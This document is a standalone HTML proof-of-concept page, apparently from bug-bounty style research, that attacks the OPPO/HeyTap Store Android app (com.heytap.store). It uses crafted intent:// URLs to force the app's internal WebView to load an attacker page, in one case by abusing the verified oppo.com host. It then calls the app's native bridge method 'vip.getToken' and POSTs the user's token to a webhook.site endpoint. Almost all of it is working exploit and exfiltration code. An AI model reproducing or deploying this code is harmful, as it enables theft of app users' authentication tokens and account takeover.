<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OPPO Store Bypass Test</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 10px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 15px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
        .red { background-color: #d32f2f; }
        .blue { background-color: #1976d2; }
        #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; }
    </style>
</head>
<body>

    <h2>OPPO Store Bypass</h2>
    <p>Target: <b>com.heytap.store</b></p>

    <button class="btn red" onclick="triggerDirect()">1. Direct Component Launch</button>
    <button class="btn blue" onclick="triggerOppoLink()">2. Verified Link Hijack</button>

    <div id="log">Logs:<br></div>

    <script>
        const myUrl = "https://pk009900.github.io/my-oppo-test/";
        const webhook = "https://webhook.site/9ed139f6-4ad2-4394-adc8-1ba1419aa0cd";
        const pkg = "com.heytap.store";

        function log(msg) {
            document.getElementById("log").innerHTML += "> " + msg + "<br>";
        }

        function triggerDirect() {
            log("Attempting Direct Activity Launch...");
            // This bypasses URL verification by targeting the internal Activity class
            const intent = `intent://${myUrl}#Intent;action=android.intent.action.VIEW;package=${pkg};component=${pkg}/com.heytap.store.webview.WebViewActivity;end`;
            window.location.href = intent;
        }

        function triggerOppoLink() {
            log("Attempting Verified Link Hijack...");
            // Uses the verified host 'www.oppo.com' to trick the OS into opening the app
            const intent = `intent://www.oppo.com?url=${myUrl}#Intent;scheme=https;package=${pkg};end`;
            window.location.href = intent;
        }

        window.onload = function() {
            if (window.HeytapNativeApi) {
                log("<b style='color:green'>SUCCESS: BRIDGE DETECTED!</b>");
                window.HeytapNativeApi.invoke("vip.getToken", (data) => {
                    fetch(webhook, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data) });
                    log("Token exfiltrated to Webhook.");
                });
            }
        };
    </script>
</body>
</html>
